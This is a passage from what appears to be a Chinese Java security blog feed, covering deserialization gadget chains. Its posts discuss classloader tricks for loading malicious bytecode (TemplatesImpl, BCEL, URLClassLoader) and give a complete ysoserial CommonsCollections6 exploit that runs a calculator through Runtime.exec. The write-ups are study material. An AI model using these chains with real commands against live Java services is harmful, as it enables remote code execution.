com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;CustomTransletClass loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows中利用如下命令对class文件进行取base64编码：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Convert</span>]::ToBase64String([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;CustomClass.class&quot;</span>)) <span class="operator">-replace</span> <span class="string">&quot;`n|`r&quot;</span></span><br></pre></td></tr></table></figure><p>回忆之前的步骤<br>我们先将<code>outerMap</code>触发改为<code>interMap</code>预填充<br>这里键名一定要是<code>&quot;value&quot;</code>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span></span><br></pre></td></tr></table></figure><p>再利用<code>AnnotationInvocationHandler​</code>自动触发<code>outermMap</code>的填充</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>将<code>handler</code>序列化并转为base64：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] payload = Base64.getDecoder().decode(<span class="string">&quot;上一步输出的base64&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure><p>成功输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CustomTransletClass loaded</span><br><span class="line">Exception in thread &quot;main&quot; org.apache.commons.collections.FunctorException: InvokerTransformer: The method &#x27;newInstance&#x27; on &#x27;class java.lang.reflect.Constructor&#x27; threw an exception</span><br><span class="line">at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:133)</span><br><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:123)</span><br><span class="line">at org.apache.commons.collections.map.TransformedMap.checkSetValue(TransformedMap.java:204)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java的classloader们</title>
      <link href="/2025/04/03/java-classloaders/"/>
      <url>/2025/04/03/java-classloaders/</url>
      
        <content type="html"><![CDATA[<p>之前在CC1和CC6的链子中<br>一开始都使用了反射调用<code>Runtime.class</code><br>这里的<code>.class</code>对象是类被jvm加载时创建的元数据</p><p>而jvm需要加载一个类时<br>会去磁盘上加载<code>.class</code>文件<br>这里的<code>.class</code>文件是源码编译后的二进制字节码数据</p><p>既然是字节码数据那么和反序列化时使用的序列化数据一样<br>很多不是可见字符，需要借助编码等方式进行直接传输</p><p>当然还有远程加载的方法：</p><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClassLoader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:80/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码会在80端口的本地网站根目录下加载一个<code>Hello.class</code></p><h3 id="加载的过程"><a href="#加载的过程" class="headerlink" title="加载的过程"></a>加载的过程</h3><p>加载的过程经历了三个函数：</p><ul><li><code>ClassLoader.loadclass</code></li></ul><p>双亲委派模型：<br>首先检查类是否已加载（通过 <code>findLoadedClass</code>）。<br>若未加载，优先委派给父类加载器（<code>parent.loadClass</code>），<br>父类无法加载时，才调用自身的 <code>findClass</code>。<br>这种分层设计保证了核心类库（如 <code>java.lang</code>）<br>由启动类加载器（<code>Bootstrap ClassLoader</code>）加载，<br>避免重复加载和安全性问题。</p><p>但是这个名字我觉得有翻译问题<br>应该叫<strong>父类委派模型</strong><br>否则的话可能会造成有两个父类链的误解</p><ul><li><code>ClassLoader.findclass</code></li></ul><p>一路向上直到委派到目标后<br>执行目标类自定义的<code>findClass</code><br>从文件、网络等获取类的字节码</p><ul><li><code>ClassLoader.defineclass</code></li></ul><p>当<code>findclass</code>成功读取字节码后，<br>传给<code>defineclass</code><br>将字节码转换为<code>Class</code>对象</p><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.org.apache.xalan.internal.xsltc.trax;</span><br></pre></td></tr></table></figure><p>这个包中的<code>TemplatesImpl</code>有一个内部类<code>TransletClassLoader</code><br>他重写了加载字节码的<code>defineclass</code>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个重写的操作使得原本被<code>protect</code>的<code>defineClass</code>方法<br>变成了<code>default</code>（可以理解为包内<code>public</code>）<br>那我们找找包内有没有<code>public</code>方法使用了它<br>如果有的话我们就可以在外部调用它了<br>有一条调用链：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() --&gt;</span><br><span class="line">TemplatesImpl#newTransformer() --&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() --&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() --&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>前两行都是<code>public</code><br>这里写个DEMO:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;NOT NULL&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 允许访问私有字段</span></span><br><span class="line">        field.set(obj, value);    <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64的部分填我们构造的恶意类的字节码的base64：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomTransletClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomTransletClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;CustomTransletClass loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里作为<code>AbstractTranslet</code>的子类，<br>是为了防止触发<code>TemplatesImpl</code>类加载器的某些错误<br>后面遇到了再细研究</p><h3 id="BCEL-ClassLoader-加载字节码"><a href="#BCEL-ClassLoader-加载字节码" class="headerlink" title="BCEL ClassLoader 加载字节码"></a>BCEL ClassLoader 加载字节码</h3><p>看看源码:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// First try: lookup hash table.</span></span><br><span class="line">    cl = (Class) classes.get(class_name);</span><br><span class="line">    <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// Second try: Load system class using system class loader. You better don&#x27;t mess around with them.for (int i = 0; i &lt; ignored_packages.length; i++) &#123;</span></span><br><span class="line">            <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">                cl = deferTo.loadClass(class_name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Third try: Special request?if (class_name.indexOf(&quot;$$BCEL$$&quot;) &gt;= 0) &#123;</span></span><br><span class="line">                clazz = createClass(class_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">                clazz = repository.loadClass(class_name);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = modifyClass(clazz);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.getBytes();</span><br><span class="line">                cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">                cl = Class.forName(class_name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写了<code>loadclass</code>方法<br>源码注释中注明了四次加载尝试，简单梳理一下这个过程：</p><ol><li>首先尝试从 classes（哈希表）中查找是否已经加载过这个类。如果找到了就直接返回</li><li>如果缓存中没有找到，方法会进行第二次尝试：加载系统类。它会遍历 <code>ignored_packages</code> 的字符串数组，这个数组里存放着一些包名的前缀（<code>&quot;java.&quot;, &quot;javax.&quot;, &quot;sun.&quot;</code>）。如果要加载的类名以这些前缀开头，那么这个类就被认为是系统类，会通过调用另一个类加载器 <code>deferTo</code> 的 <code>loadClass</code> 方法来加载。这样做应该是为了避免自定义的类加载器干扰到系统类的加载</li><li>如果仍然没有加载成功，方法会进行第三次尝试，处理一个特殊请求：若类名以 <code>$$BCEL$$</code> 开头则调用 <code>createClass()</code> 创建一个类，这个方法将 BCEL 字节码转换成 JavaClass 对象</li><li>不以 <code>$$BCEL$$</code> 开头则通过一个 repository 加载类</li><li>如果上面两步成功获取到了 Class 对象（无论是创建的还是从 repository 加载的），就会调用 <code>defineClass()</code></li><li>上述步骤都失败则使用默认类加载器 <code>Class.forName()</code></li></ol><p>为了创建用于被加载的 BCEL 字节码，可以用 BCEL 提供的两个类 <code>Repository</code> <code>Utility</code></p><ul><li><code>Repository.lookup()</code> 可以加载一个类，解析为 JavaClass 对象</li><li><code>Utility.encode()</code> 将 JavaClass 对象转换成 BCEL 字节码</li></ul><p>简单的demo：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BCELExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(CustomClass.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections6</title>
      <link href="/2025/03/27/java-cc6/"/>
      <url>/2025/03/27/java-cc6/</url>
      
        <content type="html"><![CDATA[<p>在java的8u71版本后，<code>AnnotationInvocationHandler</code><br>类的<code>readObject</code>方法逻辑变化了<br>这就导致了我们的CC1链子失效<br>所以这里有另一种链子较为通用<br>：<code>ysoserial</code>的<code>CommonsCollections6</code>:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Step 1: 构造Transformer链（最终触发Runtime.exec）</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 6: 生成恶意序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 7: 模拟反序列化攻击（触发漏洞）</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();  <span class="comment">// 此处弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><ul><li><strong>翻译器链子</strong></li></ul><p>这个还是和CC1最后一样，<br>反射调用到<code>Runtime</code>进行命令执行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>实际上执行的操作:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时如果执行:</p><figure class="highlight 